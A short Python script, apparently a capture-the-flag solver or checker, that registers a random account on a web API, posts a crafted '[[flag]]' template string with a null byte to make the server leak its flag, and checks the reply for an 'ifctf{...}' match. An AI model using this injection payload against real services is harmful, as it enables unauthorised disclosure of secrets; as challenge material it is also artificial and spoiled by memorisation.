#!/usr/bin/env python3
from argparse import ArgumentParser
from re import match
import random
import string
import requests

def main(hostname):
    username = ''.join(random.choices(string.ascii_lowercase, k=32))
    password = ''.join(random.choices(string.ascii_lowercase, k=32))

    s = requests.Session()

    r = s.post(f"{hostname}/api/v1/register", json={
        'username': username,
        'password': password
    })

    r = s.post(f"{hostname}/api/v1/login", json={
        'username': username,
        'password': password
    })

    access_token = r.json()['data']['accessToken']

    r = s.post(f"{hostname}/api/v1/posts",
        json={
            'content': '[[flag]]\u0023a7fe35e5-b4c4-49eb-8796-1fb9cd0da828\u0000'
        },
        headers = {
            'Authorization': f'Bearer {access_token}'
        }
    )

    r = s.get(f"{hostname}/api/v1/posts",
        headers = {
            'Authorization': f'Bearer {access_token}'
        }
    )

    if match(r'ifctf{.*}', r.json()['data']['posts'][0]['content']):
        print("OK - Flag found")
        exit(0)

    print("ERR - flag not found")
    exit(1)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--url', type=str, default='http://localhost/')
    args = parser.parse_args()
    main(args.url)
